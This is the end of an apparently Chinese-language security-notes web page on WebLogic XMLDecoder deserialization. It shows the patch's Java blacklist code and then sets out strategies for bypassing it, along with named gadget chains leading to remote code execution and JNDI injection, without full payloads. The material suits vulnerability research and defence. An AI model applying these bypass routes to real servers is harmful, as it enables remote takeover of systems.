               throw new IllegalStateException(&quot;Invalid element qName:new&quot;);
            } else if(qName.equalsIgnoreCase(&quot;method&quot;)) {
               throw new IllegalStateException(&quot;Invalid element qName:method&quot;);
            } else {
               if(qName.equalsIgnoreCase(&quot;void&quot;)) {
                  for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) {
                     if(!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException(&quot;Invalid attribute for element void:&quot; + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase(&quot;array&quot;)) {
                  String var9 = attributes.getValue(&quot;class&quot;);
                  if(var9 != null &amp;&amp; !var9.equalsIgnoreCase(&quot;byte&quot;)) {
                     throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);
                  }
</code></pre>
<p>直接绕它的黑名单的话，有如下思路</p>
<p>"</p>
<p>使用class标签构造类，但是由于限制了method函数，无法进行函数调用，只能从构造方法下手，且参数为基本类型：</p>
<ul>
<li>构造函数有写文件操作，文件名和内容可控，可以进行getshell。</li>
<li>构造函数有其他的反序列化操作，我们可以进行二次反序列化操作。</li>
<li>构造函数直接有执行命令的操作，执行命令可控。</li>
<li>有其它的可能导致rce的操作，比如表达式注入之类的。</li>
</ul>
<p>目前存在的利用链有：</p>
<ul>
<li>FileSystemXmlApplicationContext-RCE</li>
<li>UnitOfWorkChangeSet-RCE</li>
<li>ysoserial-jdk7u21-RCE</li>
<li>JtaTransactionManager-JNDI注入</li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../../shiro/shiro/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../../shiro/shiro/" class="btn btn-xs btn-link">
        shiro
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Weblogic/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Weblogic/" class="btn btn-xs btn-link">
        Weblogic
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>